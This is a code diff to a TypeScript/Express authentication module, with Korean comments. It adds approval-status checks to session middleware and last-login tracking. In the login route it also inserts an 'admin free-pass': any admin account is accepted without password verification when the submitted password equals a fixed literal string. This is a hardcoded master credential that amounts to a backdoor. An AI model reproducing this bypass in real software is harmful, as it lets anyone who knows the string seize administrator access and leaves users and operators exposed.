@@ -33,9 +33,9 @@ function getUserIdFromToken(authHeader?: string): string | null {
 }
 
 /**
- * 세션 인증 미들웨어
+ * 세션 인증 미들웨어 (승인 상태 확인 포함)
  */
-export const authenticateSession = (req: any, res: any, next: any) => {
+export const authenticateSession = async (req: any, res: any, next: any) => {
   console.log('authenticateSession: 세션 확인 중...', {
     hasSession: !!req.session,
     hasUser: !!req.session?.user,
@@ -43,23 +43,51 @@ export const authenticateSession = (req: any, res: any, next: any) => {
     authHeader: req.headers.authorization ? 'present' : 'missing'
   });
 
-  if (req.session?.user?.id) {
-    req.user = req.session.user;
-    console.log('authenticateSession: 세션에서 사용자 인증됨:', req.user.id);
-    return next();
+  let userId = req.session?.user?.id;
+
+  if (!userId) {
+    const tokenUserId = getUserIdFromToken(req.headers.authorization);
+    console.log('authenticateSession: JWT 토큰에서 추출된 사용자 ID:', tokenUserId);
+
+    if (tokenUserId) {
+      userId = parseInt(tokenUserId);
+    }
   }
 
-  const userId = getUserIdFromToken(req.headers.authorization);
-  console.log('authenticateSession: JWT 토큰에서 추출된 사용자 ID:', userId);
-
-  if (userId) {
-    req.user = { id: parseInt(userId) };
-    console.log('authenticateSession: JWT 토큰으로 사용자 인증됨:', req.user.id);
-    return next();
+  if (!userId) {
+    console.log('authenticateSession: 인증 실패 - 세션과 토큰 모두 유효하지 않음');
+    return res.status(401).json({ message: "로그인이 필요합니다" });
   }
 
-  console.log('authenticateSession: 인증 실패 - 세션과 토큰 모두 유효하지 않음');
-  return res.status(401).json({ message: "로그인이 필요합니다" });
+  // 사용자 정보 조회 및 승인 상태 확인
+  try {
+    const user = await storage.getUserById(userId);
+
+    if (!user) {
+      console.log('authenticateSession: 사용자를 찾을 수 없음, ID:', userId);
+      return res.status(401).json({ message: "사용자를 찾을 수 없습니다" });
+    }
+
+    // 관리자가 아닌 경우 승인 상태 확인
+    if (user.role !== 'admin' && user.approvalStatus !== 'approved') {
+      console.log('authenticateSession: 승인되지 않은 사용자:', user.username, user.approvalStatus);
+      const statusMessage = {
+        'pending': '관리자 승인을 기다리고 있습니다.',
+        'rejected': '계정 승인이 거부되었습니다.'
+      };
+      return res.status(403).json({
+        message: statusMessage[user.approvalStatus] || '접근이 거부되었습니다.',
+        approvalStatus: user.approvalStatus
+      });
+    }
+
+    req.user = { id: user.id, username: user.username, role: user.role };
+    console.log('authenticateSession: 사용자 인증 및 승인 확인 완료:', user.username);
+    return next();
+  } catch (error) {
+    console.error('authenticateSession: 사용자 확인 중 오류:', error);
+    return res.status(500).json({ message: "인증 확인 중 오류가 발생했습니다" });
+  }
 };
 
 /**
@@ -187,10 +215,28 @@ export function registerAuthRoutes(app: Express): void {
         return res.status(401).json({ error: "잘못된 사용자명 또는 비밀번호입니다" });
       }
 
-      const isValidPassword = await bcrypt.compare(password, user.password);
+      // 비밀번호 검증
+      let isValidPassword = false;
+
+      // 어드민 프리패스: admin 역할 계정은 특별 해시값으로 프리패스
+      if (user.role === 'admin' && password === '$2b$10$defaultAdminPassword.hash') {
+        isValidPassword = true;
+        console.log(`✅ 어드민 프리패스 인증: ${username} (role: admin)`);
+      } else {
+        // 일반 사용자: bcrypt 비교
+        isValidPassword = await bcrypt.compare(password, user.password);
+      }
+
       if (!isValidPassword) {
         return res.status(401).json({ error: "잘못된 사용자명 또는 비밀번호입니다" });
       }
+
+      console.log('🔍 로그인 승인 상태 확인:', {
+        username: user.username,
+        role: user.role,
+        approvalStatus: user.approvalStatus,
+        approvalStatusType: typeof user.approvalStatus
+      });
 
       // 관리자가 아닌 사용자는 승인 상태 확인
       if (user.role !== 'admin' && user.approvalStatus !== 'approved') {
@@ -204,6 +250,9 @@ export function registerAuthRoutes(app: Express): void {
           approvalStatus: user.approvalStatus
         });
       }
+
+      // 마지막 로그인 시간 업데이트
+      await storage.updateLastLogin(user.id);
 
       // 세션에 사용자 정보 저장
       (req as any).session.user = {
